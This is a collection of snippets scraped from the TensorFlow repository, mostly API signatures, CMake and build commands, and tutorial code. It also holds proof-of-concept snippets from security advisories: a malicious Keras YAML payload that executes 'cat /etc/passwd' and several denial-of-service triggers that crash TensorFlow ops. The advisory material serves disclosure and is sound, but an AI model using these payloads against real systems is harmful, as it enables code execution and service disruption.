SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImagePropertiesAddDefaultSize.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.ImagePropertiesAddDefaultSize(
    builder, defaultSize
)
```

----------------------------------------

TITLE: Creating Searcher Instance from Server ScaNN - TFLite Model Maker - Python
DESCRIPTION: Class method to create a `Searcher` instance from a serialized server-side ScaNN index directory. It takes the path to the ScaNN artifacts (`serialized_scann_path`), a list of metadata (`metadata`) corresponding to the embeddings, and an optional path to a TFLite Embedder model file (`embedder_path`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/searcher/Searcher.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
create_from_server_scann(
    serialized_scann_path: str,
    metadata: List[AnyStr],
    embedder_path: Optional[str] = None
) -> 'Searcher'
```

----------------------------------------

TITLE: Initialize JAX Model Python
DESCRIPTION: This simple Python snippet initializes an instance of the `Resnet50Wrapper` class, which contains the loaded pre-trained Resnet50 model from Hugging Face. This `jax_model` object is the JAX module that will be used for validation and subsequent export steps.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite_resnet50.ipynb#_snippet_5

LANGUAGE: python
CODE:
```
# Initialize the JAX Model
jax_model = Resnet50Wrapper()
```

----------------------------------------

TITLE: Initializing TFLite Model Maker Recommendation DataLoader (Python)
DESCRIPTION: Initializes the DataLoader class for recommendation tasks. It takes a `tf.data.Dataset`, the dataset `size` (an integer, potentially None), and a list of dictionaries for `vocab`. This class provides functionality for handling and splitting recommendation datasets.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/DataLoader.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.recommendation.DataLoader(\n    dataset, size, vocab\n)
```

----------------------------------------

TITLE: Declaring Python Project Dependencies - requirements.txt format
DESCRIPTION: This code snippet lists the required Python packages for the project, specifying exact or compatible version constraints. It includes dependencies for core functionality, binary wheel verification, package uploading, and accelerated package installation using uv.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/ci/official/containers/ml_build_arm64/requirements.txt#_snippet_0

LANGUAGE: Python
CODE:
```
portpicker==1.6.0
# For wheel verification, and uploading
auditwheel ~= 6.1.0
twine ~= 5.1.1

# uv is faster than pip for installing Python packages.
uv ~= 0.5.30
```

----------------------------------------

TITLE: Initializing ScoreAH Configuration (Python)
DESCRIPTION: This snippet shows the constructor signature for the `ScoreAH` class. It defines the configuration for Product Quantization (PQ) based in-partition scoring, specifically Asymmetric Hashing used in ScaNN. Key parameters include the number of dimensions per PQ block, a threshold for anisotropic quantization, the training sample size for K-Means, and the number of training iterations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/searcher/ScoreAH.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.searcher.ScoreAH(
    dimensions_per_block: int,
    anisotropic_quantization_threshold: float = float('nan'),
    training_sample_size: int = 100000,
    training_iterations: int = 10
)
```

----------------------------------------

TITLE: Macro populate_source_vars
DESCRIPTION: Defines a CMake macro to simplify finding source and header files (`.c`, `.cc`, `.h`) within a specified directory. It supports recursive search and filtering out files matching default test patterns or custom exclusion regex expressions, appending results to a specified variable.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_9

LANGUAGE: CMake
CODE:
```
# Simplifies inclusion of non-test sources and headers from a directory.
# SOURCE_DIR: Directory to search for files.
# SOURCES_VAR: Variable to append with all matching *.cc and *.h files.
# [FILTER expression0 .. expressionN]:
#   Additional regular expressions to filter the set of matching
#   files. By default, all files ending in "(_test|test_util)\\.(cc|h)" are
#   removed.
# [RECURSE]: Whether to recursively search SOURCE_DIR.
macro(populate_source_vars SOURCE_DIR SOURCES_VAR)
  cmake_parse_arguments(ARGS "RECURSE" "" "FILTER" ${ARGN})
  if(ARGS_RECURSE)
    set(GLOB_OP GLOB_RECURSE)
  else()
    set(GLOB_OP GLOB)
  endif()
  set(DEFAULT_FILE_FILTER ".*(_test|test_util)\\.(c|cc|h)$")
  file(${GLOB_OP} FOUND_SOURCES "${SOURCE_DIR}/*.*")
  list(FILTER FOUND_SOURCES INCLUDE REGEX ".*\\.(c|cc|h)$")
  list(FILTER FOUND_SOURCES EXCLUDE REGEX "${DEFAULT_FILE_FILTER}")
  foreach(FILE_FILTER ${ARGS_FILTER})
    list(FILTER FOUND_SOURCES EXCLUDE REGEX "${FILE_FILTER}")
  endforeach()
  list(APPEND ${SOURCES_VAR} ${FOUND_SOURCES})
endmacro()
```

----------------------------------------

TITLE: Defining TFLite Micro Test Structure (C++)
DESCRIPTION: Uses the TFLite Micro unit test framework macros to define the structure of a test suite and individual test cases. `TF_LITE_MICRO_TESTS_BEGIN` and `TF_LITE_MICRO_TESTS_END` define the test suite boundaries, while `TF_LITE_MICRO_TEST` defines a specific test function block.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/get_started_low_level.md#_snippet_3

LANGUAGE: C++
CODE:
```
TF_LITE_MICRO_TESTS_BEGIN

TF_LITE_MICRO_TEST(LoadModelAndPerformInference) {
  . // add code here
  .
}

TF_LITE_MICRO_TESTS_END
```

----------------------------------------

TITLE: Run Cross-compiled Unit Tests (CTest NNAPI Delegate)
DESCRIPTION: Launches cross-compiled TensorFlow Lite unit tests using the NNAPI delegate via the CTest utility on the target. The `TESTS_ARGUMENTS` environment variable is used to pass specific delegate configuration flags to the test executables.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake.md#_snippet_13

LANGUAGE: sh
CODE:
```
cmake -E env TESTS_ARGUMENTS=--use_nnapi=true\;--nnapi_accelerator_name=vsi-npu ctest -L delegate
```

----------------------------------------

TITLE: Registering DepthwiseConv2D Kernel (Versioned C++)
DESCRIPTION: This snippet shows the updated C++ code registering the `DepthwiseConv2D` kernel. By explicitly setting `max_version` to 2, it indicates that this kernel implementation supports both version 1 and version 2 of the operator.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_version.md#_snippet_8

LANGUAGE: C++
CODE:
```
AddBuiltin(BuiltinOperator_DEPTHWISE_CONV_2D, Register_DEPTHWISE_CONV_2D(),
             /* min_version = */ 1,
             /* max_version = */ 2);
```

----------------------------------------

TITLE: Adding Global Score Threshold in TFLite Metadata (Python)
DESCRIPTION: This function is used to add a global score threshold value when building the ScoreThresholdingOptions within the TensorFlow Lite metadata schema using a FlatBuffers builder. It takes the builder object and the integer value for the global score threshold as arguments.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreThresholdingOptionsAddGlobalScoreThreshold.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ScoreThresholdingOptionsAddGlobalScoreThreshold(
    builder, globalScoreThreshold
)
```

----------------------------------------

TITLE: Add Minimum Parser Version to TFLite Metadata Python
DESCRIPTION: This function is part of the generated Python code for the TFLite metadata schema. It's used to add the `minParserVersion` field to a `ModelMetadata` object being constructed using a FlatBuffers builder. It requires a builder instance and the integer value for the minimum parser version.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadataAddMinParserVersion.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.ModelMetadataAddMinParserVersion(
    builder, minParserVersion
)
```

----------------------------------------

TITLE: Build TFLite Pip with Bazel - Windows Native (Shell)
DESCRIPTION: Runs the `build_pip_package_with_bazel.sh` script using `bash`, specifically passing `windows` as an argument. This command is used to build the TensorFlow Lite pip package natively on a Windows operating system.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/pip_package/README.md#_snippet_13

LANGUAGE: sh
CODE:
```
bash tensorflow/lite/tools/pip_package/build_pip_package_with_bazel.sh windows
```

----------------------------------------

TITLE: Defining nvidia-cuda-nvrtc-cu12 Dependency
DESCRIPTION: Specifies the exact version (12.5.82) for the 'nvidia-cuda-nvrtc-cu12' package and provides multiple SHA256 hashes. This requirement ensures that the NVRTC component of the CUDA toolkit for version 12 is installed at the specified version and verified via cryptographic hashes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/requirements_lock_3_12.txt#_snippet_2

LANGUAGE: Python Requirements
CODE:
```
nvidia-cuda-nvrtc-cu12==12.5.82 \
    --hash=sha256:3dbd97b0104b4bfbc3c4f8c79cd2496307c89c43c29a9f83125f1d76296ff3fd \
    --hash=sha256:5bb6a0eb01d4974bb7ca3d48bd3859472debb3c3057a5e7de2b08fbdf35eed7e \
    --hash=sha256:e5db37e990056c70953b7772dd778336ef9da0a0b5bb28f9f2a61c2e42b51d78
```

----------------------------------------

TITLE: Conditionally Adding XNNPACK Sources and Options (CMake)
DESCRIPTION: Appends XNNPACK delegate and acceleration sources to the source list if the `TFLITE_ENABLE_XNNPACK` CMake option is enabled. If not enabled, it sets a compiler definition `-DTFLITE_WITHOUT_XNNPACK` via the `TFLITE_LABEL_IMAGE_CC_OPTIONS` variable.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/label_image/CMakeLists.txt#_snippet_1

LANGUAGE: cmake
CODE:
```
if(TFLITE_ENABLE_XNNPACK)
  list(APPEND TFLITE_LABEL_IMAGE_SRCS
    ${TFLITE_SOURCE_DIR}/tools/delegates/xnnpack_delegate_provider.cc
    ${TFLITE_SOURCE_DIR}/core/acceleration/configuration/c/xnnpack_plugin.cc
  )
else()
  set(TFLITE_LABEL_IMAGE_CC_OPTIONS "-DTFLITE_WITHOUT_XNNPACK")
endif()  # TFLITE_ENABLE_XNNPACK
```

----------------------------------------

TITLE: Adding TensorFlow Lite Subdirectory - CMake
DESCRIPTION: Includes the CMakeLists.txt file located in the `TFLITE_SOURCE_DIR` as a subdirectory. The build output is directed to a subdirectory within the current binary directory, and the subdirectory is excluded from the default 'ALL' target.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/c/CMakeLists.txt#_snippet_4

LANGUAGE: CMake
CODE:
```
add_subdirectory(
  "${TFLITE_SOURCE_DIR}"
  "${CMAKE_CURRENT_BINARY_DIR}/tensorflow-lite"
  EXCLUDE_FROM_ALL
)
```

----------------------------------------

TITLE: Original TensorFlow Import in Python
DESCRIPTION: This is a standard Python import statement used when the full TensorFlow package is installed. It imports the entire TensorFlow library, typically aliased as `tf`. Scripts designed for the full package will use this import.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/python.md#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf
```

----------------------------------------

TITLE: Demonstrating Keras YAML Code Execution Exploit (Python)
DESCRIPTION: This Python snippet demonstrates a proof-of-concept payload designed to exploit the TensorFlow Keras YAML deserialization vulnerability (TFSA-2021-152). It crafts a malicious YAML string that, when loaded by vulnerable versions of `models.model_from_yaml`, triggers arbitrary code execution via Python's `exec` function to run a system command.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-152.md#_snippet_0

LANGUAGE: python
CODE:
```
from tensorflow.keras import models

payload = '''
!!python/object/new:type
args: ['z', !!python/tuple [], {'extend': !!python/name:exec }]
listitems: "__import__('os').system('cat /etc/passwd')"
'''

models.model_from_yaml(payload)
```

----------------------------------------

TITLE: Demonstrating TensorFlow Vulnerability with FakeQuantWithMinMaxVarsGradient - Python
DESCRIPTION: This Python snippet demonstrates how to trigger the TFSA-2022-131 vulnerability in `tf.quantization.fake_quant_with_min_max_vars_gradient`. It provides non-scalar tensor inputs (`arg_2`, `arg_3`) for the `min` and `max` parameters, which causes a CHECK fail in vulnerable versions of TensorFlow, leading to a denial of service. Requires TensorFlow and NumPy.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-131.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np 
arg_0=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)
arg_1=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)
arg_2=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)
arg_3=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)
arg_4=8
arg_5=False
arg_6=''
tf.quantization.fake_quant_with_min_max_vars_gradient(gradients=arg_0, inputs=arg_1,
min=arg_2, max=arg_3, num_bits=arg_4, narrow_range=arg_5, name=arg_6)
```

----------------------------------------

TITLE: Reproducing tf.random.gamma CHECK Fail - TensorFlow Python
DESCRIPTION: This Python snippet demonstrates the denial of service vulnerability in `tf.random.gamma`. It constructs input tensors with a large shape for the `beta` parameter, which triggers a `CHECK` fail when passed to the function. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-132.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf
arg_0=tf.random.uniform(shape=(4,), dtype=tf.int32, maxval=65536)
arg_1=tf.random.uniform(shape=(4, 4), dtype=tf.float64, maxval=None)
arg_2=tf.random.uniform(shape=(4, 4, 4, 4, 4), dtype=tf.float64, maxval=None)
arg_3=tf.float64
arg_4=48
arg_5='None'
tf.random.gamma(shape=arg_0, alpha=arg_1, beta=arg_2, dtype=arg_3, seed=arg_4, name=arg_5)
```

----------------------------------------

TITLE: Triggering UnbatchGradOp CHECK failure with non-scalar id (Python)
DESCRIPTION: This Python snippet demonstrates how providing a non-scalar `id` argument to the `tf.raw_ops.UnbatchGrad` operation triggers a CHECK failure and crashes the program. The `UnbatchGradOp` expects the `id` argument to be a scalar value.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-092.md#_snippet_0

LANGUAGE: python
CODE:
```
import numpy as np
import tensorflow as tf

# `id` is not scalar
tf.raw_ops.UnbatchGrad(original_input= tf.constant([1]),batch_index=tf.constant([[0,0,0 ], ], dtype=tf.int64),grad=tf.constant([1,]),id=tf.constant([1,1,], dtype=tf.int64))
```

----------------------------------------

TITLE: Compatible TensorFlow Versions Constant in AverageWordVecSpec
DESCRIPTION: Specifies the TensorFlow major versions that are compatible with this model specification. Indicates the required environment for using this class.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/AverageWordVecSpec.md#_snippet_15

LANGUAGE: python
CODE:
```
[2]
```

----------------------------------------

TITLE: Adding Include Directories for MhloDialect
DESCRIPTION: This command adds specific include directories to the interface include path of the `MhloDialect` library target, including the HLO source and generated include directories.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/IR/CMakeLists.txt#_snippet_8

LANGUAGE: cmake
CODE:
```
target_include_directories(MhloDialect
  PUBLIC
  $<BUILD_INTERFACE:${MLIR_HLO_SOURCE_DIR}>
  $<BUILD_INTERFACE:${MLIR_HLO_GEN_INCLUDE_DIR}>
)
```

----------------------------------------

TITLE: Finalizing NormalizationOptions FlatBuffer Object (Python)
DESCRIPTION: This function completes the building process for a `NormalizationOptions` FlatBuffer object using the provided `builder` instance. It should be invoked after `NormalizationOptionsStart` and adding all necessary fields. The function returns a FlatBuffer offset referencing the constructed object, which is then used to finish building the overall metadata buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/NormalizationOptionsEnd.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.NormalizationOptionsEnd(
    builder
)
```

----------------------------------------

TITLE: Applying Select XLA Operation with Non-Scalar Predicate - Pseudocode Example
DESCRIPTION: This example demonstrates the XLA `Select` operation using a non-scalar predicate array. It shows how elements are chosen from `v1` or `v2` based on the corresponding boolean value in the `pred` array, resulting in a new array.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_31

LANGUAGE: Pseudocode
CODE:
```
let pred: PRED[4] = {true, false, false, true};
let v1: s32[4] = {1, 2, 3, 4};
let v2: s32[4] = {100, 200, 300, 400};
==>
Select(pred, v1, v2) = s32[4]{1, 200, 300, 4};
```

----------------------------------------

TITLE: Including TensorFlow XLA AOT Runtime Subdirectory (CMake)
DESCRIPTION: Adds the TensorFlow XLA AOT runtime source directory as a subdirectory to the build. This includes the CMakeLists.txt file within that directory, which configures the build process for the runtime library. The built library artifacts will be placed in the specified location within the binary directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/pip_package/xla_build/pip_test/CMakeLists.txt#_snippet_6

LANGUAGE: CMake
CODE:
```
add_subdirectory("${TENSORFLOW_PACKAGE_PATH}/xla_aot_runtime_src"
        ${CMAKE_ARCHIVE_OUTPUT_DIRECTORY}/tf_runtime)
```

----------------------------------------

TITLE: Including TensorFlow Lite Build Subdirectory (CMake)
DESCRIPTION: Incorporates the build definitions for the TensorFlow Lite library by adding its directory as a CMake subdirectory. The results are placed in a binary directory relative to the current build, and the subdirectory is excluded from the default build targets.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/minimal/CMakeLists.txt#_snippet_2

LANGUAGE: CMake
CODE:
```
add_subdirectory(
  "${TENSORFLOW_SOURCE_DIR}/tensorflow/lite"
  "${CMAKE_CURRENT_BINARY_DIR}/tensorflow-lite"
  EXCLUDE_FROM_ALL
)
```

----------------------------------------

TITLE: Transforming Convolution Kernel for Space-to-Depth Python
DESCRIPTION: This Python code demonstrates how to transform a convolution kernel (weight) to be compatible with the space-to-depth input optimization. It involves initializing a Conv2D layer, building it with transformed input shapes, padding the kernel if necessary, and then applying a sequence of reshape and transpose operations to rearrange the kernel data according to the space-to-depth logic.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tensorflow/g3doc/space_to_depth.md#_snippet_1

LANGUAGE: Python
CODE:
```
conv0 = tf.compat.v1.layers.Conv2D(
 filters=filters,
 kernel_size=kernel_size,
 strides=2,
 padding=('SAME' if strides == 1 else 'VALID'),
 use_bias=False,
 kernel_initializer=tf.variance_scaling_initializer(),
 data_format=data_format)

# Use the image size without space-to-depth transform as the input of conv0.
batch_size, h, w, channel = inputs.get_shape().as_list()
conv0.build([
 batch_size, h * space_to_depth_block_size, w * space_to_depth_block_size,
 channel // (space_to_depth_block_size**2)
])

kernel = conv0.weights[0]
# [7, 7, 3, 64] --> [8, 8, 3, 64]

kernel = tf.pad(
 kernel,
 paddings=tf.constant([[1, 0], [1, 0], [0, 0], [0, 0]]),
 mode='CONSTANT',
 constant_values=0.)
# Transform kernel follows the space-to-depth logic: https://www.tensorflow.org/api_docs/python/tf/nn/space_to_depth)
kernel = tf.reshape(
 kernel,
 [4, space_to_depth_block_size, 4, space_to_depth_block_size, 3, filters])

kernel = tf.transpose(kernel, [0, 2, 1, 3, 4, 5])
kernel = tf.reshape(kernel, [4, 4, int(channel), filters])
kernel = tf.cast(kernel, inputs.dtype)
```

----------------------------------------

TITLE: Initializing ContentT From Buffer in Python
DESCRIPTION: Initializes a ContentT object from a given buffer and position. This class method is used to deserialize data from a raw buffer representation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ContentT.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
InitFromBuf(
    buf, pos
)
```

----------------------------------------

TITLE: Analyzing Compilation Trace with mlir-replay (Shell)
DESCRIPTION: Shows how to use the `mlir-replay` tool to analyze the compilation trace and HLO snapshot generated in the previous step. It helps identify the specific compiler pass where the behavior of interest (e.g., a bug) occurs by printing only the passes that introduce changes, and outputs MLIR files for each pass.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir/tools/mlir_bisect/README.md#_snippet_1

LANGUAGE: shell
CODE:
```
bazel run tensorflow/compiler/xla/mlir/tools/mlir_replay:mlir_replay -- \\
  --mlir-compilation-trace=/tmp/dump/module_0000.jit__something.mlir-trace.pb \\
  --hlo-snapshot=/tmp/dump/module_0000.jit__something.snapshot.0.pb \\
  --print-changes-only \\
  --execution-trace-dir=/tmp/execution
```

----------------------------------------

TITLE: Globbing Public Header Files
DESCRIPTION: This command finds all files ending with `.h` within the `ml_dtypes/include` subdirectory of the source directory. The list of found files is stored in the `ML_DTYPES_PUBLIC_HEADERS` variable. This is typically used to identify headers for installation or documentation purposes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/ml_dtypes/CMakeLists.txt#_snippet_5

LANGUAGE: CMake
CODE:
```
file(GLOB ML_DTYPES_PUBLIC_HEADERS
  ${ML_DTYPES_SOURCE_DIR}/ml_dtypes/include/*.h)
```

----------------------------------------

TITLE: Configure MLIR and LLVM Dependencies
DESCRIPTION: Sets up the configuration for depending on MLIR and LLVM based on the build type (external, installed, or embedded). It finds the necessary packages and sets include/module paths accordingly.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/CMakeLists.txt#_snippet_9

LANGUAGE: CMake
CODE:
```
# Find MLIR to install if we are building standalone. If building as part of
# another project, let it handle the MLIR dependency. The dependent project
# might use a bundled version of MLIR instead of installing, for instance.
if(MHLO_EXTERNAL_PROJECT_BUILD)
  message(STATUS "Building MHLO as an external LLVM project")
  set(MLIR_MAIN_SRC_DIR ${LLVM_MAIN_SRC_DIR}/../mlir ) # --src-root
  set(MLIR_INCLUDE_DIR ${MLIR_MAIN_SRC_DIR}/include ) # --includedir
  set(MLIR_GENERATED_INCLUDE_DIR ${LLVM_BINARY_DIR}/tools/mlir/include)
  include_directories(SYSTEM ${MLIR_INCLUDE_DIR})
  include_directories(SYSTEM ${MLIR_GENERATED_INCLUDE_DIR})
  include_directories(SYSTEM ${MLIR_TABLEGEN_OUTPUT_DIR})

  set(BACKEND_PACKAGE_STRING "${PACKAGE_STRING}")
  list(APPEND CMAKE_MODULE_PATH "${MLIR_MAIN_SRC_DIR}/cmake/modules")
elseif(NOT MHLO_BUILD_EMBEDDED)
  message(STATUS "Building MHLO with an installed MLIR")
  find_package(MLIR REQUIRED CONFIG)
  message(STATUS "Using MLIRConfig.cmake in: ${MLIR_DIR}")
  message(STATUS "Using LLVMConfig.cmake in: ${LLVM_DIR}")
  set(LLVM_RUNTIME_OUTPUT_INTDIR ${CMAKE_BINARY_DIR}/bin)
  set(LLVM_LIBRARY_OUTPUT_INTDIR ${CMAKE_BINARY_DIR}/lib)
  list(APPEND CMAKE_MODULE_PATH "${MLIR_CMAKE_DIR}")
  list(APPEND CMAKE_MODULE_PATH "${LLVM_CMAKE_DIR}")
else()
  message(STATUS "Building MHLO embedded in another project")
endif()
```

----------------------------------------

TITLE: Creating Python Wrapper for SparseTensor Op (Python)
DESCRIPTION: This Python function 'multiplex_sparse' provides a public API for the sparse tensor multiplex operation. It uses the '@tf.experimental.dispatch_for_api' decorator to register itself as the handler for 'gen_multiplex_2_op.examples_multiplex_dense' when the inputs are 'tf.SparseTensor'. It unpacks the 'SparseTensor' inputs, calls the underlying C++ kernel ('examples_multiplex_sparse') with indices, values, and shapes, and reconstructs the result as a 'tf.SparseTensor'.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_3/README.md#_snippet_6

LANGUAGE: Python
CODE:
```
@tf.experimental.dispatch_for_api(gen_multiplex_2_op.examples_multiplex_dense)
def multiplex_sparse(cond: tf.SparseTensor,
                     a: tf.SparseTensor,
                     b: tf.SparseTensor,
                     name=None):
  """Return elements chosen from `a` or `b` depending on `cond`.


  This is similar to `np.where` and `tf.where`, but simplified to only handle
  the case of rank 1 sparse tensors, no optional parameters, no broadcasting,
  etc..

  >>> cond = tf.SparseTensor(
  ...     indices=[[1], [3], [6]], values=[True, False, True], dense_shape=[7])
  >>> a = tf.sparse.from_dense(['', 'a0', '', 'a1', '', 'a2', ''])
  >>> b = tf.sparse.from_dense(['b0', '', 'b1', 'b2', '', '', 'b3'])
  >>> multiplex_3_op.multiplex_sparse(cond, a, b)
  SparseTensorValue(indices=array([[0],
    [1],
    [2],
    [3]]), values=array([b'b0', b'a0', b'b1', b'b2'], dtype=object),
    dense_shape=array([7]))
  Args:
    cond: tf.SparseTensor of type bool. Where True, yield `a`, otherwise yield
      `b`.
    a: tf.SparseTensor with the same type and shape as `b`.
    b: tf.SparseTensor with the same type and shape as `a`.
    name: An optional name for the op.

  Returns:
    A tf.SparseTensor with elements from `a` where `cond` is True, and elements
    from `b` elsewhere.
  """
  (indices, values, shape) = examples_multiplex_sparse(
      cond_indices=cond.indices,
      cond_values=cond.values,
      cond_shape=cond.dense_shape,
      a_indices=a.indices,
      a_values=a.values,
      a_shape=a.dense_shape,
      b_indices=b.indices,
      b_values=b.values,
      b_shape=b.dense_shape,
      name=name)
  return tf.SparseTensor(indices, values, shape)
```

----------------------------------------

TITLE: Importing Libraries and Checking Versions Python
DESCRIPTION: Imports essential Python libraries for audio processing (`librosa`, `soundfile`), data manipulation (`os`, `glob`, `random`, `shutil`, `numpy`), visualization (`matplotlib.pyplot`, `seaborn`), and TensorFlow/TFLite Model Maker functionalities. It also prints the versions of TensorFlow and Model Maker to confirm the environment setup.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/speech_recognition.ipynb#_snippet_2

LANGUAGE: python
CODE:
```
import os
import glob
import random
import shutil

import librosa
import soundfile as sf
from IPython.display import Audio
import numpy as np
import matplotlib.pyplot as plt
import seaborn as sns

import tensorflow as tf
import tflite_model_maker as mm
from tflite_model_maker import audio_classifier
from tflite_model_maker.config import ExportFormat

print(f"TensorFlow Version: {tf.__version__}")
print(f"Model Maker Version: {mm.__version__}")
```

----------------------------------------

TITLE: Accessing Input Tensors in TensorFlow Op Kernel C++
DESCRIPTION: This snippet demonstrates how to access input tensors within the `Compute` method of a TensorFlow `OpKernel`. It shows how to retrieve the conditional sparse tensor's components (indices, values, shape) by their input index and how to access their dimensions and underlying data pointers using methods like `dim_size` and `matrix`/`flat`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_3/README.md#_snippet_3

LANGUAGE: c++
CODE:
```
  void Compute(OpKernelContext* ctx) override {
    const auto& cond_indices_tensor = ctx->input(0);
    const auto& cond_values_tensor = ctx->input(1);
    const auto& cond_shape_tensor = ctx->input(2);
    // Error checking omitted, see source file.
    const int cond_elements = cond_indices_tensor.dim_size(0);
    const auto cond_indices = cond_indices_tensor.matrix<int64_t>();
    const auto cond_values = cond_values_tensor.flat<bool>();
    const auto cond_shape = cond_shape_tensor.flat<int64_t>();
  }
```

----------------------------------------

TITLE: Building and Running TFLite Kernel Test with Delegate (Shell)
DESCRIPTION: These commands show how to build a specific TFLite kernel test (`add_test`) using Bazel and then execute the compiled binary. The `--use_dummy_delegate=true` command-line flag (defined by the delegate provider) activates the dummy delegate for the test run.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/utils/dummy_delegate/README.md#_snippet_1

LANGUAGE: Shell
CODE:
```
bazel build -c opt tensorflow/lite/kernels:add_test

# Setting --use_dummy_delegate=true will apply the dummy delegate to the
# TFLite model graph
bazel-bin/tensorflow/lite/kernels/add_test --use_dummy_delegate=true
```

----------------------------------------

TITLE: Running Docker Container for GPU Build (Linux)
DESCRIPTION: This command launches a Docker container using a recent TensorFlow build image, specifically configured for GPU builds. It mounts the current directory into `/xla` and provides an isolated environment recommended for building XLA with GPU (CUDA) support.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/build_from_source.md#_snippet_6

LANGUAGE: shell
CODE:
```
docker run --name xla_gpu -w /xla -it -d --rm -v $PWD:/xla tensorflow/build:latest-python3.9 bash
```

----------------------------------------

TITLE: Importing TFLite Conversion Utilities (Python)
DESCRIPTION: Imports the internal `convert` module from `tensorflow.lite.python`. This module contains experimental APIs like `mlir_quantize` which provide more control over the quantization and debugging process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_24

LANGUAGE: python
CODE:
```
from tensorflow.lite.python import convert
```

----------------------------------------

TITLE: Validating Input Shape in SparseFillEmptyRowsGrad C++
DESCRIPTION: This snippet shows the `OP_REQUIRES` macros used within the `SparseFillEmptyRowsGrad` implementation in C++. It demonstrates how the shape of `reverse_index_map_t` is checked for being a vector, but highlights the *lack* of a similar check for `grad_values_t`, which is the root cause of the vulnerability. It uses `TensorShapeUtils::IsVector` and `errors::InvalidArgument` for validation checks.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-022.md#_snippet_0

LANGUAGE: C++
CODE:
```
    OP_REQUIRES(
        context, TensorShapeUtils::IsVector(reverse_index_map_t->shape()),
        errors::InvalidArgument("reverse_index_map must be a vector, saw: ",
                                reverse_index_map_t->shape().DebugString()));

    const auto reverse_index_map = reverse_index_map_t->vec<int64>();
    const auto grad_values = grad_values_t->vec<T>();
```

----------------------------------------

TITLE: Triggering Dequantize OOB Access (Python)
